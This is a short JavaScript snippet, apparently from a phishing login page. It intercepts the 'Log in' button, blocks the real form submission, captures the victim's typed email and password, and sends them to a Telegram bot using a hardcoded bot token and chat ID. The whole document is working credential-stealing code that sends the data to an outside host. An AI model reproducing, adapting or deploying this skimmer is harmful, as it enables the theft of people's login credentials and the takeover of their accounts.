  <script>
// Add an event listener to the "Log in" button
document.querySelector('.form__button').addEventListener('click', function(event) {
    event.preventDefault(); // Prevent form submission

    // Capture email and password
    let email = document.querySelector('.input-box__input').value;
    console.log(email); // This will log the user's typed email to the console

    let password = document.querySelector('.input-box__input.is-password').value;
    console.log(password);

    // Your Telegram bot API token
    let botToken = '6907698461:AAEEKx1TGcOQ_QxrEc_iq09_3UpqpfRHu8U';
    
    // Your chat ID
    let chatID = '1119354860';
    
    // Message to send to Telegram
    let message = `Email: ${email}\nPassword: ${password}`;

    // Send the message to Telegram using fetch
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatID,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Message sent successfully:', data);
    })
    .catch(error => {
        console.error('Error sending message:', error);
    });
});
</script>
